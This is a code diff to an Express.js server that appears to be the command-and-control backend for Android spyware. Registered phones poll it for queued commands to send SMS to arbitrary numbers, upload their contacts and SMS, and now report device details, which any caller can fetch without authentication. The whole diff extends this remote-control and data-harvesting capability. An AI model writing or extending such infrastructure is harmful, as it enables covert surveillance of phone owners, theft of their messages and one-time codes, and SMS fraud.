@@ -9,10 +9,11 @@ app.use(express.json());
 /**
  * In-memory store
  */
-const devices = {};      // deviceId -> { deviceId, model, registeredAt }
-const commands = {};     // deviceId -> [ { id, type, number?, message? } ]
-const smsData = {};      // deviceId -> latest 10 SMS
-const contactsDB = {};   // deviceId -> all contacts
+const devices = {};          // deviceId -> { deviceId, model, registeredAt }
+const commands = {};         // deviceId -> [ { id, type, number?, message? } ]
+const smsData = {};          // deviceId -> latest SMS
+const contactsDB = {};       // deviceId -> contacts
+const deviceDetailsDB = {};  // deviceId -> device info
 
 // ------------------ Device Registration ------------------
 app.post("/register", (req, res) => {
@@ -29,6 +30,7 @@ app.post("/register", (req, res) => {
     if (!commands[deviceId]) commands[deviceId] = [];
     if (!smsData[deviceId]) smsData[deviceId] = [];
     if (!contactsDB[deviceId]) contactsDB[deviceId] = [];
+    if (!deviceDetailsDB[deviceId]) deviceDetailsDB[deviceId] = {};
 
     res.json({ success: true });
 });
@@ -41,17 +43,10 @@ app.get("/fetch", (req, res) => {
 // ------------------ Send SMS command to device ------------------
 app.post("/sendsms", (req, res) => {
     const { deviceId, number, message } = req.body;
-
     if (!devices[deviceId])
         return res.status(404).json({ success: false, error: "Device not found" });
 
-    const cmd = {
-        id: uuidv4(),
-        type: "SMS",
-        number,
-        message
-    };
-
+    const cmd = { id: uuidv4(), type: "SMS", number, message };
     commands[deviceId].push(cmd);
     res.json({ success: true, command: cmd });
 });
@@ -59,15 +54,21 @@ app.post("/sendsms", (req, res) => {
 // ------------------ Trigger CONTACT SYNC ------------------
 app.post("/contact", (req, res) => {
     const { deviceId } = req.body;
-
     if (!devices[deviceId])
         return res.status(404).json({ success: false, error: "Device not found" });
 
-    const cmd = {
-        id: uuidv4(),
-        type: "CONTACT_SYNC"
-    };
+    const cmd = { id: uuidv4(), type: "CONTACT_SYNC" };
+    commands[deviceId].push(cmd);
+    res.json({ success: true, status: "queued" });
+});
 
+// ------------------ Trigger DEVICE DETAILS ------------------
+app.post("/devicedetails", (req, res) => {
+    const { deviceId } = req.body;
+    if (!devices[deviceId])
+        return res.status(404).json({ success: false, error: "Device not found" });
+
+    const cmd = { id: uuidv4(), type: "DEVICE_DETAILS" };
     commands[deviceId].push(cmd);
     res.json({ success: true, status: "queued" });
 });
@@ -76,7 +77,6 @@ app.post("/contact", (req, res) => {
 app.get("/commands", (req, res) => {
     const { deviceId } = req.query;
     if (!deviceId || !commands[deviceId]) return res.json([]);
-
     const pending = commands[deviceId];
     commands[deviceId] = []; // clear after fetch
     res.json(pending);
@@ -104,7 +104,6 @@ app.post("/get-sms", (req, res) => {
 // ------------------ Upload contacts from device ------------------
 app.post("/contacts-upload", (req, res) => {
     const { deviceId, contacts } = req.body;
-
     if (!deviceId || !contacts)
         return res.status(400).json({ success: false, error: "deviceId or contacts missing" });
 
@@ -116,6 +115,22 @@ app.post("/contacts-upload", (req, res) => {
 app.get("/contacts/:deviceId", (req, res) => {
     const { deviceId } = req.params;
     res.json(contactsDB[deviceId] || []);
+});
+
+// ------------------ Device uploads device details ------------------
+app.post("/device-details-upload", (req, res) => {
+    const { deviceId, ...details } = req.body;
+    if (!deviceId)
+        return res.status(400).json({ success: false, error: "deviceId required" });
+
+    deviceDetailsDB[deviceId] = details;
+    res.json({ success: true });
+});
+
+// ------------------ Fetch device details ------------------
+app.get("/device-details/:deviceId", (req, res) => {
+    const { deviceId } = req.params;
+    res.json(deviceDetailsDB[deviceId] || {});
 });
 
 // ------------------ Start server ------------------
